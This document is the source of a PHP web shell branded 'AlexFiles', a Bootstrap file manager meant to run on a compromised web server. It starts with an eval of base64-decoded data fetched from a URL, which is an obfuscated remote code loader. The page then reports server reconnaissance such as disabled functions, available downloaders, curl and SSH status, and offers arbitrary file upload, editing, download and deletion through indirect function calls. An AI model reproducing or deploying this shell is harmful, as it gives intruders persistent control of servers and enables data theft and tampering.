<?php
$fi = file_get_contents('http://localhost/1-tools/test/file/json.php');
$ob = json_decode($fi);
$al = $ob->data;
eval(base64_decode($al));
?>
<!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
	<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
	<title><?= $shellName ?></title>
	<link rel="icon" type="image/x-icon" href="<?= $logo ?>">
</head>
<body>
	<div class="container-lg">
		
		<nav class="navbar navbar-light bg-light">
			<div class="container-fluid">
				<a class="navbar-brand" href="?">
					<img src="<?= $logo ?>" alt="logo" width="30" height="24" class="d-inline-block align-text-top">
					<?= $shellName ?>
				</a>
			</div>
		</nav>
		
		<?php if (isset($_SESSION['message'])) : ?>
		<div class="alert alert-<?= $_SESSION['class'] ?> alert-dismissible fade show my-3" role="alert">
			<strong><?= $_SESSION['status'] ?>!</strong> <?= $_SESSION['message'] ?>
			<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
		</div>
		<?php endif; clear(); ?>

		<div id="tool">
			<div class="d-flex justify-content-center flex-wrap my-3">
				<a href="?" class="m-1 btn btn-outline-dark btn-sm"><i class="fa fa-home"></i> Home</a>
				<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#upload" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-upload"></i> Upload</a>
				<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#newfile" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-file-plus"></i> New File</a>
				<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#newfolder" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> New Folder</a>
			</div>
			
			<div class="row">
				<div class="col-md-12">
					<div class="collapse" id="upload" data-bs-parent="#tool">
						<div class="card card-body border-dark mb-3">
							<div class="row">
								 <div class="col-md-6">
									<form action="" method="post" enctype="multipart/form-data">
										<div class="input-group">
											<input type="file" class="form-control" name="uploadfile[]" id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload">
											<button class="btn btn-outline-dark" type="submit" id="inputGroupFileAddon04">Upload</button>
										</div>
									</form>
								 </div>
							</div>
						</div>
					</div>
				</div>
				<div class="col-md-12">
					<div class="collapse" id="newfile" data-bs-parent="#tool">
						<div class="card card-body border-dark mb-3">
							<div class="row">
								<div class="col-md-6">
									<form action="" method="post">
										<div class="mb-3">
											<label class="form-label">File Name</label>
											<input type="text" class="form-control" name="filename" placeholder="Alex-Files.txt">
										</div>
										<div class="mb-3">
											<label class="form-label">File Content</label>
											<textarea class="form-control" rows="5" name="filecontent"></textarea>
										</div>
										<button type="submit" class="btn btn-outline-dark">Create</button>
									</form>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div class="col-md-12">
					<div class="collapse" id="newfolder" data-bs-parent="#tool">
						<div class="card card-body border-dark mb-3">
							<div class="row">
								<div class="col-md-6">
									<form action="" method="post">
										<div class="mb-3">
											<label class="form-label">Folder Name</label>
											<input type="text" class="form-control" name="foldername" placeholder="Alex-Files">
										</div>
										<button type="submit" class="btn btn-outline-dark">Create</button>
									</form>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>

		<div class="row">
			<div class="col-md-12">
				<div class="card border-dark">
					<div class="card-body">
						<h5><i class="fa fa-server"></i> Server Information </h5>
						<div class="table-responsive">
							<table class="table table-hover text-nowrap">
								<tr>
									<td>Operating System</td>
									<td> : <?= $uname ?></td>
								</tr>
								<tr>
									<td>User / Group</td>
									<td> : <?= $uid ?>[<?= $user ?>] / <?= $gid ?>[<?= $group ?>]</td>
								</tr>
								<tr>
									<td>PHP Version</td>
									<td> : <?= $func[1]() ?></td>
								</tr>
								<tr>
									<td>IP Server</td>
									<td> : <?= (!@$_SERVER["SERVER_ADDR"] ? ($func[49]("gethostbyname") ? @gethostbyname($_SERVER['SERVER_NAME']) : '????') : @$_SERVER["SERVER_ADDR"]) ?></td>
								</tr>
								<tr>
									<td>Storage</td>
									<td class="d-flex">: Total = <?= formatSize($total) ?>, Free = <?= formatSize($free) ?> [<?= $pers ?>%]</td>
								</tr>
								<tr>
									<td>Domains</td>
									<td>: <?= $dom ?></td>
								</tr>
								<tr>
									<td>Software</td>
									<td>: <?= $_SERVER['SERVER_SOFTWARE'] ?></td>
								</tr>
								<tr>
									<td>Disable Functions</td>
									<td>: <?= $show_ds ?></td>
								</tr>
								<tr>
									<td>Useful Functions</td>
									<td>: <?= rtrim($useful, ', ') ?></td>
								</tr>
								<tr>
									<td>Downloader</td>
									<td>: <?= rtrim($downloader, ', ') ?></td>
								</tr>
								<tr>
									<td colspan="2">CURL : <?= $func[49]('curl_version') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | SSH2 : <?= $func[49]('ssh2_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | Magic Quotes : <?= $func[49]('get_magic_quotes_gpc') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | MySQL : <?= $func[49]('mysql_get_client_info') || class_exists('mysqli') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | MSSQL : <?= $func[49]('mssql_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | PostgreSQL : <?= $func[49]('pg_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | Oracle : <?= $func[49]('oci_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?></td>
								</tr>
								<tr>
									<td colspan="2">Safe Mode : <?= @$func[31]('safe_mode') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | Open Basedir : <?= $open_b ?> | Safe Mode Exec Dir : <?= @$func[31]('safe_mode_exec_dir') ? '<font class="text-success">'. @$func[31]('safe_mode_exec_dir') .'</font>' : '<font class="text-warning">NONE</font>' ?> | Safe Mode Include Dir : <?= @$func[31]('safe_mode_include_dir') ? '<font class="text-success">'. @$func[31]('safe_mode_include_dir') .'</font>' : '<font class="text-warning">NONE</font>' ?></td>
								</tr>
							</table>
						</div>
					</div>
				</div>
			</div>
			<div class="col-md-12 my-3">
				<div class="card border-dark">
					<div class="card-body">
						<h5><i class="fa fa-wave-square"></i> Path </h5>
						<nav aria-label="breadcrumb" style="--bs-breadcrumb-divider: '>';">
							<ol class="breadcrumb">
								<?php
									$numDir = count($scdir);
									foreach ($scdir as $id => $pat) {
										if ($pat == '' && $id == 0) {
											echo '<li class="breadcrumb-item"><a class="text-decoration-none text-dark" href="?dir=/">/</a></li>';
											continue;
										}
										if ($pat == '') continue;
										if ($id + 1 == $numDir) {
											echo '<li class="breadcrumb-item active" aria-current="page">'.$pat.'</li>';
										} else {
											echo '<li class="breadcrumb-item"><a class="text-decoration-none text-dark" href="?dir=';
											for ($i = 0; $i <= $id; $i++) {
												echo "$scdir[$i]";
												if ($i != $id) echo "/";
											}
											echo '">'.$pat.'</a></li>';
										}
									}
								?>
							</ol>
						</nav>
						[ <?= checkPerm($dir, perms($dir)) ?> ]
					</div>
				</div>
			</div>
			<div class="col-md-12" id="main">
				<div class="card border-dark overflow-auto">
					<div class="card-body">
						<h5><i class="fa fa-<?= $icon ?>"></i> <?= $title ?></h5>
						<?php if ($do == 'view') : ?>
							<h1>Anjing</h1>
						<?php else: ?>
							<?php if ($func[9]($dir)) : ?>
								<div class="table-responsive">
									<table class="table table-hover text-nowrap">
										<thead>
											<tr>
												<th>Name</th>
												<th>Type</th>
												<th>Size</th>
												<th>Last Modified</th>
												<th>Owner/Group</th>
												<th>Permission</th>
												<th>Action</th>
											</tr>
										</thead>
										<tbody>
											<?php
												foreach ($scandir as $item) :
													if (!$func[6]($dir . '/' . $item)) continue;
											?>
												<tr>
													<td>
														<?php if ($item === '..') : ?>
														<a href="?dir=<?= $func[28]($dir); ?>" class="text-decoration-none text-dark"><i class="fa fa-folder-open"></i> <?= $item ?></a>
														<?php elseif ($item === '.') :  ?>
														<a href="?dir=<?= $dir; ?>" class="text-decoration-none text-dark"><i class="fa fa-folder-open"></i> <?= $item ?></a>
														<?php else : ?>
														<a href="?dir=<?= $dir . '/' . $item ?>" class="text-decoration-none text-dark"><i class="fa fa-folder"></i> <?= checkName($item); ?></a>
														<?php endif; ?>
													</td>
													<td><?= $func[38]($item) ?></td>
													<td class="align-middle">--</td>
													<td><?= $func[19]("Y-m-d h:i:s", $func[20]($item)); ?></td>
													<td><?= getowner($item) ?></td>
													<td><?= checkPerm($dir . '/' . $item, perms($dir . '/' . $item))  ?></td>
													<td>
														<button type="button" class="btn btn-outline-dark btn-sm mr-1" <?= $item === ".." || $item === "." ? '' : 'data-bs-toggle="modal" data-bs-target="#renameModal" data-bs-name="'.$item.'"' ?>><i class="fa fa-edit"></i></button>
														<button type="button" class="btn btn-outline-dark btn-sm mr-1" <?= $item === ".." || $item === "." ? '' : 'data-bs-toggle="modal" data-bs-target="#deleteModal" data-bs-file="'.$dir . '/' . $item.'"'?>><i class="fa fa-trash-alt"></i></button>
													</td>
												</tr>
											<?php endforeach; ?>
											<?php
												foreach ($scandir as $item) :
													if (!$func[7]($dir . '/' . $item)) continue;
											?>
												<tr>
													<td><a data-bs-toggle="modal" href="#viewModal" role="button" data-bs-name="<?= $item ?>" data-bs-content="<?= $func[18](@$func[14]($item)) ?>" class="text-dark text-decoration-none"><i class="fa fa-<?= geticon($item) ?>"></i> <?= checkName($item); ?></a></td>
													<td><?= checkName(($func[49]('mime_content_type') ? $func[63]($item) : $func[38]($item))) ?></td>
													<td><?= formatSize($func[10]($item)) ?></td>
													<td><?= $func[19]("Y-m-d h:i:s", $func[20]($item)); ?></td>
													<td><?= getowner($item) ?></td>
													<td><?= checkPerm($dir . '/' . $item, perms($dir . '/' . $item))  ?></td>
													<td>
														<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#renameModal" data-bs-name="<?= $item ?>"><i class="fa fa-edit"></i></button>
														<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#viewModal" data-bs-name="<?= $item ?>" data-bs-content="<?= $func[18](@$func[14]($item)) ?>"><i class="fa fa-file-signature"></i></button>
														<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#downloadModal" data-bs-file="<?= $dir . '/' . $item ?>"><i class="fa fa-download"></i></button>
														<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#deleteModal" data-bs-file="<?= $dir . '/' . $item ?>"><i class="fa fa-trash-alt"></i></button>
													</td>
												</tr>
											<?php endforeach; ?>
										</tbody>
									</table>
								</div>
							<?php else: ?>
								<font class="text-danger">Can't read this directory!</font>
							<?php endif; ?>
						<?php endif; ?>
					</div>
				</div>
			</div>
			<div class="col-md-12 my-3">
				<div class="card border-dark">
					<div class="card-body">
						Copyright © AlexFiles <span class="float-end">Coded by <span class="text-muted">AlexLog</span></span>
					</div>
				</div>
			</div>
		</div>
	</div>
	
	<div class="modal fade" id="renameModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
	  <div class="modal-dialog modal-dialog-centered">
	    <div class="modal-content">
	      <div class="modal-header">
	        <h5 class="modal-title" id="renameModalLabel">Rename</h5>
	        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
	      </div>
	      <form method="post" id="rename-form">
		      <div class="modal-body">
		          <div class="mb-3">
		            <label for="newname" class="col-form-label">New Name:</label>
		            <input type="text" class="form-control" name="newname" id="newname">
		          </div>
		      </div>
		      <div class="modal-footer">
		        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
		        <button type="submit" class="btn btn-primary">Rename</button>
		      </div>
        </form>
	    </div>
	  </div>
	</div>
	
	<div class="modal fade" id="deleteModal" aria-hidden="true" aria-labelledby="deleteModalToggleLabel2" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1">
	  <div class="modal-dialog modal-dialog-centered">
	    <div class="modal-content">
	      <div class="modal-header">
	        <h5 class="modal-title" id="exampleModalToggleLabel2">Delete</h5>
	        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
	      </div>
	      <div class="modal-body">
	        Are you sure want to delete this?
	      </div>
	      <div class="modal-footer">
	        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
	        <a href="" class="btn btn-danger" id="delete-confirm">Delete</a>
	      </div>
	      
	    </div>
	  </div>
	</div>
	
	<div class="modal fade" id="downloadModal" aria-hidden="true" aria-labelledby="deleteModalToggleLabel2" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1">
	  <div class="modal-dialog modal-dialog-centered">
	    <div class="modal-content">
	      <div class="modal-header">
	        <h5 class="modal-title" id="exampleModalToggleLabel2">Download</h5>
	        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
	      </div>
	      <div class="modal-body">
	        Are you sure want to download this?
	      </div>
	      <div class="modal-footer">
	        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
	        <a href="" class="btn btn-danger" id="download-confirm">Download</a>
	      </div>
	      
	    </div>
	  </div>
	</div>
	
	<div class="modal fade" id="viewModal" aria-hidden="true" aria-labelledby="deleteModalToggleLabel2" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1">
	  <div class="modal-dialog modal-dialog-centered">
	    <div class="modal-content">
	      <div class="modal-header">
	        <h5 class="modal-title" id="exampleModalToggleLabel2">View</h5>
	        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
	      </div>
	      <form action="" method="post">
		      <div class="modal-body">
		        <div class="mb-3">
	            <label for="content" class="col-form-label">Content:</label>
	            <textarea class="form-control" id="content" rows="15" name="content"></textarea>
	          </div>
		      </div>
		      <div class="modal-footer">
		        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
		        <button type="submit" class="btn btn-primary">Save</button>
		      </div>
	      </form>
	    </div>
	  </div>
	</div>
	
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
	<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
	<script>
		var renameModal = document.getElementById('renameModal')
		var deleteModal = document.getElementById('deleteModal')
		var viewModal = document.getElementById('viewModal')
		var downloadModal = document.getElementById('downloadModal')
		
		renameModal.addEventListener('show.bs.modal', function (event) {
			var button = event.relatedTarget
			var name = button.getAttribute('data-bs-name')
			var modalTitle = renameModal.querySelector('.modal-title')
			var modalBodyInput = renameModal.querySelector('.modal-body input')
			var hiddenInput = document.createElement('input')
			hiddenInput.type = "hidden";
			hiddenInput.value = name;
			hiddenInput.name = "oldname";
			document.getElementById("rename-form").appendChild(hiddenInput);
			
			modalBodyInput.value = name
		})
		
		deleteModal.addEventListener('show.bs.modal', function (event) {
			var button = event.relatedTarget
			var file = button.getAttribute('data-bs-file')
			var deleteConfirm = document.getElementById('delete-confirm')
			deleteConfirm.href = '?dir=' + file + '&do=delete'
		})
		
		downloadModal.addEventListener('show.bs.modal', function (event) {
			var button = event.relatedTarget
			var file = button.getAttribute('data-bs-file')
			var downloadConfirm = document.getElementById('download-confirm')
			downloadConfirm.href = '?dir=' + file + '&do=download'
		})
		
		viewModal.addEventListener('show.bs.modal', function (event) {
			var button = event.relatedTarget
			var content = button.getAttribute('data-bs-content')
			var name = button.getAttribute('data-bs-name')
			var modalTitle = viewModal.querySelector('.modal-title')
			var modalContent = viewModal.querySelector('.modal-body textarea')
			var hiddenInput = document.createElement('input')
			hiddenInput.type = "hidden";
			hiddenInput.value = name;
			hiddenInput.name = "filename";
			viewModal.querySelector("form").appendChild(hiddenInput);

			modalTitle.textContent = 'Edit ' + name
			modalContent.value = content
		})
	</script>
</body>
</html>
